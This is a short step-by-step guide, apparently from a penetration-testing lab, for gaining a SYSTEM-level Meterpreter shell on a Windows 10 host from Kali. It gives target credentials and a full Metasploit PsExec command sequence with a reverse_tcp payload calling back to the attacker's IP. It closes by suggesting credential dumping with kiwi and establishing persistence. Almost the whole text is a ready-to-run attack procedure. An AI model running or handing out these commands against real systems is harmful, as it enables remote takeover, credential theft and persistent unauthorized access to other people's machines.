**SYSTEM shell on a Windows 10 machine from Kali** using **Metasploit and PsExec**:

---

## 🛠️ Step-by-Step: SYSTEM Shell on Windows 10 from Kali

### ✅ Prerequisites
- Kali Linux machine with `Metasploit Framework` installed
- Windows 10 target with:
  - IP: `172.22.117.20`
  - Username: `tstark`
  - Password: `Password!`
  - Domain: `megacorpone`
- You must have SMB access and valid admin credentials

---

### 1. **Start Metasploit**
```bash
msfconsole
```

---

### 2. **Use the PsExec module**
```bash
use exploit/windows/smb/psexec
```

---

### 3. **Set required options**
```bash
set RHOSTS 172.22.117.20
set SMBUser tstark
set SMBPass Password!
set SMBDomain megacorpone
set LHOST 172.22.117.100   # Your Kali IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

> 🔁 If port 4444 is taken, use another like 5555:
```bash
set LPORT 5555
```

---

### 4. **Run the exploit**
```bash
run
```

> This should give you a **Meterpreter session as SYSTEM**.

---

### 5. **Verify SYSTEM access**
```bash
getuid
```

> You should see something like:
```
Server username: NT AUTHORITY\SYSTEM
```

---

You now have full SYSTEM-level shell on the target. From here, you can run `load kiwi`, dump credentials, establish persistence, etc.
